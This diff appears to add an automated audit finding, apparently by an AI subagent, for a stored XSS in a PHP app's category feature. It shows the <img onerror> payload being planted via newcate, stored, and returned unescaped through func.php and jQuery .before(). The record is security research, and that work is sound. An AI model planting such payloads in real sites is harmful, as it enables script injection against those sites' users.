@@ -1,0 +1,15 @@
+=== MANONG-04: stored XSS via newcate -> issue.category -> cate()/crawl() output ===
+[plant] a=add with newcate=<img src=x onerror=alert(1)> (stored via mb_strtoupper):
+{"res":1,"msg":"success","cate":"<IMG SRC=X ONERROR=ALERT(1)>"}
+[stored] DB value:
+id	category
+7	<IMG SRC=X ONERROR=ALERT(1)>
+[sink 1] GET a=cate JSON (option built unescaped, returned to JS $(el).before(data.html)):
+{"html":"<select name=\"category\"><option value=\"0\">\u8bf7\u9009\u62e9<\/option><option value=\"<IMG SRC=X ONERROR=ALERT(1)>\"><IMG SRC=X ONERROR=ALERT(1)><\/option><option value=\"C\">C<\/option><option value=\"EVIL\">EVIL<\/option><option value=\"PHP\">PHP<\/option><option value=\"PYTHON\">PYTHON<\/option><\/select>","cate":["<IMG SRC=X ONERROR=ALERT(1)>","C","EVIL","PHP","PYTHON"]}
+[sink 2] crawl output reflects category for matching title (value='...'):
+[sink code path] manong.php:61-70 (crawl submit) -> $.getJSON('index.php?a=cate', data => $('.add').before(data.html))
+- func.php:116 builds '<option value="' . $val . '">' . $val . '</option>' with NO htmlspecialchars (write side: add() stores trim($_GET['newcate']) via mb_strtoupper, no escaping either)
+- captured a=cate JSON shows the payload unescaped in BOTH positions:
+  <option value="<IMG SRC=X ONERROR=ALERT(1)>"><IMG SRC=X ONERROR=ALERT(1)></option>
+- jQuery .before(htmlString) parses the string into live DOM nodes; the inner-text <IMG SRC=X ONERROR=ALERT(1)> becomes a real <img> element; failed load of src=x fires onerror -> alert(1). Uppercase tags are still valid HTML.
+[limitation] headless subagent: no browser dialog capture performed; execution implied by exact sink code path (server-side storage + unescaped output verified directly).
